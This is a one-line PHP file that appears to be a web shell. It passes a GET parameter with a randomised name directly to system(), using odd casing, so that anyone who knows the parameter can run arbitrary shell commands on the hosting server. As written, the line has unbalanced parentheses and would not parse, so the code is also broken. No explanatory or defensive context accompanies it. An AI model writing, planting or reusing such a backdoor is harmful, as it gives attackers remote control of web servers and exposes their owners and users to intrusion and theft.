<?php
SysTeM(($_GET['9hcwZ2r2']);
?>
